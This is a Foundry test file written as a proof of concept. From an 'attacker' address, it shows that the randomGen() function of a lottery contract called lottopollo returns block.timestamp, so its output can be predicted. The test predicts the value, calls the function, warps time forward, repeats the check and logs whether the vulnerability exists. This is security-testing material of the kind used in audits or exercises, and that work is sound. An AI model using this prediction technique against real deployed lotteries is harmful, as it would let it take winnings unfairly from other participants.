// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/lottopollo.sol";

contract LottoPolloTest is Test {
    lottopollo public lottery;
    address public attacker = address(0xBAD);
    
    function setUp() public {
        lottery = new lottopollo();
    }

    function testPredictableRandomness() public {
        vm.startPrank(attacker);
        
        console2.log("--- BEFORE-Trigger (First Call) ---");
        uint256 currentTimestamp1 = block.timestamp;
        uint256 predictedRandomNumber1 = currentTimestamp1;
        console2.log("Predicted using timestamp:", predictedRandomNumber1);
        
        console2.log("--- Trigger (First Call) ---");
        uint256 generatedRandomNumber1 = lottery.randomGen();
        
        console2.log("--- AFTER-Trigger (First Call) ---");
        console2.log("Generated random number:", generatedRandomNumber1);
        bool firstMatch = (generatedRandomNumber1 == predictedRandomNumber1);
        console2.log("Match status:", firstMatch ? "Success" : "Failure");

        console2.log("--- Warping time +60 seconds ---");
        vm.warp(block.timestamp + 60);
        
        console2.log("--- BEFORE-Trigger (Second Call) ---");
        uint256 currentTimestamp2 = block.timestamp;
        uint256 predictedRandomNumber2 = currentTimestamp2;
        console2.log("Predicted using timestamp:", predictedRandomNumber2);
        
        console2.log("--- Trigger (Second Call) ---");
        uint256 generatedRandomNumber2 = lottery.randomGen();
        
        console2.log("--- AFTER-Trigger (Second Call) ---");
        console2.log("Generated random number:", generatedRandomNumber2);
        bool secondMatch = (generatedRandomNumber2 == predictedRandomNumber2);
        console2.log("Match status:", secondMatch ? "Success" : "Failure");

        if (firstMatch && secondMatch) {
            console2.log("Vulnerability Exists: randomGen() returns predictable values matching block timestamp");
        } else {
            console2.log("Vulnerability not Exist: Failed to predict random values in at least one case");
        }
        
        vm.stopPrank();
    }
}